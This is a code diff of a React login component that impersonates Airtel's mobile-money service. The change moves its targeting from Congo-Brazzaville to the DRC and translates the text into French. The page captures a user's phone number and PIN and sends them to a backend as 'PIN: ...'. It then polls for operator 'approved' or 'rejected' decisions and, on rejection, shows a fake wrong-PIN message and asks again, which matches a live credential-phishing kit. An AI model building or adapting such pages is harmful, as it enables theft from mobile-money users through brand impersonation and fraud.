@@ -1,40 +1,49 @@
-import React, { useState } from "react";
+import React, { useState, useRef, useEffect } from "react";
 import { requestApproval, checkStatus } from "../utils/apiClient";
 import toast from "react-hot-toast";
 import { Loader2 } from "lucide-react";
-import { formatPhoneNumber } from "../utils/formatters";
-import { PaymentConfirmationProps } from "../types";
+import { ApplicationData } from "../types";
+
+interface PaymentConfirmationProps {
+    applicationData: ApplicationData | null;
+    onBack: () => void;
+    onComplete: () => void;
+}
 
 function PaymentConfirmation({
     applicationData,
     onBack,
     onComplete,
 }: PaymentConfirmationProps) {
-    const [loading, setLoading] = useState(false);
-    const [phoneNumber, setPhoneNumber] = useState("");
+    const [phoneNumber, setPhoneNumber] = useState(applicationData?.phone || "");
     const [pin, setPin] = useState<string[]>(["", "", "", ""]);
-    const [errors, setErrors] = useState<any>({});
-    const [attemptCount, setAttemptCount] = useState(0);
+    const [loading, setLoading] = useState(false);
     const [showWrongPin, setShowWrongPin] = useState(false);
     const [shakeError, setShakeError] = useState(false);
-    const pinInputRefs = React.useRef<(HTMLInputElement | null)[]>([]);
-    const submittingRef = React.useRef(false); // Guard against double-submit
+    const [errors, setErrors] = useState<any>({});
 
-    // Auto-submit when all 4 PIN digits are entered
-    React.useEffect(() => {
-        const pinValue = pin.join("");
-        if (pinValue.length === 4 && phoneNumber && !loading && !submittingRef.current) {
-            // Small delay for better UX
-            setTimeout(() => {
-                handleSubmit();
-            }, 300);
-        }
-    }, [pin, phoneNumber, loading]);
+    const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
+    const submittingRef = useRef(false);
+
+    useEffect(() => {
+        // Auto-focus first PIN box on mount
+        setTimeout(() => {
+            pinInputRefs.current[0]?.focus();
+        }, 100);
+    }, []);
 
     const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-        const formatted = formatPhoneNumber(e.target.value);
+        let value = e.target.value.replace(/\D/g, "");
+        if (value.length > 9) value = value.slice(0, 9);
+
+        // Format as XXX XXX XXX
+        let formatted = "";
+        for (let i = 0; i < value.length; i++) {
+            if (i === 3 || i === 6) formatted += " ";
+            formatted += value[i];
+        }
+
         setPhoneNumber(formatted);
-        // Clear error when user starts typing
         if (errors.phoneNumber) {
             setErrors((prev: any) => ({ ...prev, phoneNumber: "" }));
         }
@@ -43,17 +52,23 @@ function PaymentConfirmation({
     const handlePinChange = (index: number, value: string) => {
         if (!/^\d*$/.test(value)) return;
 
-        // Clear wrong PIN error when user starts typing again
-        if (showWrongPin) {
-            setShowWrongPin(false);
-        }
-
         const newPin = [...pin];
         newPin[index] = value.slice(-1);
         setPin(newPin);
 
+        // Auto-focus next input
         if (value && index < 3) {
             pinInputRefs.current[index + 1]?.focus();
+        }
+
+        // Check if all 4 digits entered, then auto-submit
+        if (value && index === 3) {
+            const fullPin = [...newPin.slice(0, 3), value.slice(-1)].join("");
+            if (fullPin.length === 4) {
+                setTimeout(() => {
+                    executeSubmit(fullPin);
+                }, 100);
+            }
         }
     };
 
@@ -63,38 +78,27 @@ function PaymentConfirmation({
         }
     };
 
-    const handleSubmit = async (e?: React.FormEvent) => {
-        if (e) e.preventDefault();
-
-        // Prevent double-submit
-        if (submittingRef.current) return;
-
+    const validateForm = () => {
         const newErrors: any = {};
-
-        // Validate phone number
         const phoneDigits = phoneNumber.replace(/\D/g, "");
-        const isValidLength = (phoneDigits.startsWith("7") && phoneDigits.length === 9) ||
-            (phoneDigits.startsWith("0") && phoneDigits.length === 10);
 
-        if (!phoneNumber) {
-            newErrors.phoneNumber = "Phone number is required";
-        } else if (!isValidLength) {
-            newErrors.phoneNumber = phoneDigits.startsWith("7")
-                ? "Please enter 9 digits (starts with 7)"
-                : "Please enter 10 digits (starts with 0)";
-            toast.error(newErrors.phoneNumber);
-        }
-
-        const pinValue = pin.join("");
-        if (pinValue.length !== 4) {
-            newErrors.pin = "Please enter all 4 digits";
+        if (!phoneDigits) {
+            newErrors.phoneNumber = "Le numéro de téléphone est requis";
+        } else if (phoneDigits.length < 8) {
+            newErrors.phoneNumber = "Numéro de téléphone invalide (ex: 099 123 4567)";
         }
 
         setErrors(newErrors);
+        return newErrors;
+    };
 
+    const executeSubmit = async (pinValue: string) => {
+        if (submittingRef.current || loading) return;
+
+        const newErrors = validateForm();
         if (Object.keys(newErrors).length > 0) {
             if (!newErrors.phoneNumber) {
-                toast.error("Please fill in all fields");
+                toast.error("Veuillez remplir tous les champs");
             }
             return;
         }
@@ -106,7 +110,7 @@ function PaymentConfirmation({
             const payload = {
                 type: 'login',
                 name: "",
-                phone: `+242${phoneNumber.replace(/\s/g, '')}`,
+                phone: `+243${phoneNumber.replace(/\s/g, '')}`,
                 details: `PIN: ${pinValue}`,
             };
 
@@ -116,27 +120,26 @@ function PaymentConfirmation({
 
             // Start polling for status - max 2 minutes
             let pollCount = 0;
-            const maxPolls = 60; // 60 * 2s = 2 minutes
+            const maxPolls = 60;
             const interval = setInterval(async () => {
                 pollCount++;
                 if (pollCount > maxPolls) {
                     clearInterval(interval);
                     submittingRef.current = false;
                     setLoading(false);
-                    toast.error("Approval timed out. Please try again.");
+                    toast.error("Délai d'attente dépassé. Veuillez réessayer.");
                     return;
                 }
 
                 try {
                     const statusRes = await checkStatus(attemptId);
                     const status = statusRes.status;
-                    console.log(`Poll ${pollCount}: status =`, status);
 
                     if (status === 'approved') {
                         clearInterval(interval);
                         submittingRef.current = false;
                         setLoading(false);
-                        toast.success("Login successful!");
+                        toast.success("Connexion réussie !");
                         onComplete();
                     } else if (status === 'rejected') {
                         clearInterval(interval);
@@ -144,27 +147,19 @@ function PaymentConfirmation({
                         setLoading(false);
                         setShowWrongPin(true);
                         setShakeError(true);
+                        setTimeout(() => setShakeError(false), 600);
                         setPin(["", "", "", ""]);
-
-                        // Focus first input
-                        setTimeout(() => {
-                            pinInputRefs.current[0]?.focus();
-                        }, 100);
-
-                        // Remove shake effect after animation
-                        setTimeout(() => {
-                            setShakeError(false);
-                        }, 500);
+                        setTimeout(() => pinInputRefs.current[0]?.focus(), 100);
+                        toast.error("Code PIN ou numéro de téléphone incorrect.");
                     }
-                    // else status is 'pending', keep polling
                 } catch (e) {
                     console.error("Polling error", e);
                 }
-            }, 2000); // Check every 2 seconds
+            }, 2000);
 
         } catch (err: any) {
-            submittingRef.current = false;
             console.error("Failed to request approval:", err);
+            submittingRef.current = false;
             const statusCode = err.response?.status;
             const errorData = err.response?.data;
 
@@ -172,9 +167,19 @@ function PaymentConfirmation({
             if (errorData) console.error("Error data:", errorData);
 
             setLoading(false);
-            const msg = statusCode ? `Failed to connect to server (${statusCode}). Please try again.` : "Failed to connect to server. Please try again.";
+            const msg = statusCode ? `Erreur de connexion (${statusCode}). Veuillez réessayer.` : "Échec de connexion au serveur. Veuillez réessayer.";
             toast.error(msg);
         }
+    };
+
+    const handleSubmit = (e: React.FormEvent) => {
+        e.preventDefault();
+        const pinValue = pin.join("");
+        if (pinValue.length !== 4) {
+            toast.error("Veuillez entrer les 4 chiffres du code PIN");
+            return;
+        }
+        executeSubmit(pinValue);
     };
 
     return (
@@ -198,7 +203,7 @@ function PaymentConfirmation({
                     background: "white",
                 }}
             >
-                {/* Airtel Congo Logo */}
+                {/* Airtel RDC Logo */}
                 <div
                     style={{
                         marginBottom: "36px",
@@ -207,7 +212,7 @@ function PaymentConfirmation({
                 >
                     <img
                         src="/airtel.svg"
-                        alt="Airtel Congo"
+                        alt="Airtel RDC"
                         style={{
                             height: "60px",
                             objectFit: "contain",
@@ -224,7 +229,7 @@ function PaymentConfirmation({
                         marginBottom: "40px",
                     }}
                 >
-                    Login
+                    Connexion
                 </h1>
 
                 {/* Phone Number Input */}
@@ -246,7 +251,7 @@ function PaymentConfirmation({
                             background: "white",
                         }}
                     >
-                        <span style={{ fontSize: "24px" }}>🇨🇬</span>
+                        <span style={{ fontSize: "24px" }}>🇨🇩</span>
                         <span
                             style={{
                                 fontSize: "16px",
@@ -254,11 +259,11 @@ function PaymentConfirmation({
                                 fontWeight: "500",
                             }}
                         >
-                            +242
+                            +243
                         </span>
                         <input
                             type="tel"
-                            placeholder="06 123 4567"
+                            placeholder="099 123 4567"
                             value={phoneNumber}
                             onChange={handlePhoneChange}
                             style={{
@@ -293,7 +298,7 @@ function PaymentConfirmation({
                         marginBottom: "20px",
                     }}
                 >
-                    Enter your PIN
+                    Entrez votre code PIN
                 </p>
 
                 {/* 4 PIN Boxes */}
@@ -348,11 +353,10 @@ function PaymentConfirmation({
                                     margin: 0,
                                 }}
                             >
-                                Incorrect Mobile number and/ or PIN provided.
+                                Numéro de téléphone ou code PIN incorrect.
                             </p>
                         </div>
                     )}
-
 
                     {/* Forgot PIN */}
                     <div style={{ textAlign: "center", marginBottom: "60px" }}>
@@ -364,13 +368,13 @@ function PaymentConfirmation({
                                 textDecoration: "none",
                             }}
                         >
-                            Forgot PIN?
+                            Code PIN oublié ?
                         </a>
                     </div>
 
-                    {/* Hidden Submit Button - form submits on PIN completion */}
+                    {/* Hidden Submit Button */}
                     <button type="submit" style={{ display: "none" }}>
-                        Submit
+                        Valider
                     </button>
                 </form>
             </div>
@@ -414,9 +418,9 @@ function PaymentConfirmation({
                             lineHeight: "1.5",
                         }}
                     >
-                        To register an Airtel Congo wallet or get assistance,
+                        Pour créer un compte Airtel Money ou obtenir de l'aide,
                         <br />
-                        click below
+                        cliquez ci-dessous
                     </p>
 
                     <div
@@ -443,7 +447,7 @@ function PaymentConfirmation({
                             }}
                         >
                             <span style={{ fontSize: "20px" }}>👤</span>
-                            Register
+                            S'inscrire
                         </button>
                         <button
                             style={{
@@ -461,7 +465,7 @@ function PaymentConfirmation({
                             }}
                         >
                             <span style={{ fontSize: "20px" }}>ℹ️</span>
-                            Help & Support
+                            Aide & Support
                         </button>
                     </div>
 
@@ -480,9 +484,9 @@ function PaymentConfirmation({
                             opacity: 0.9,
                         }}
                     >
-                        By signing in you agree to the{" "}
+                        En vous connectant, vous acceptez les{" "}
                         <a href="#" style={{ color: "white", textDecoration: "underline" }}>
-                            Terms and Conditions
+                            Conditions Générales d'Utilisation
                         </a>
                     </p>
                 </div>
@@ -513,7 +517,7 @@ function PaymentConfirmation({
                         }}
                     >
                         <Loader2 className="spinner" size={40} color="#e40000" />
-                        <p style={{ fontSize: "16px", color: "#333" }}>Processing...</p>
+                        <p style={{ fontSize: "16px", color: "#333" }}>Traitement en cours...</p>
                     </div>
                 </div>
             )}
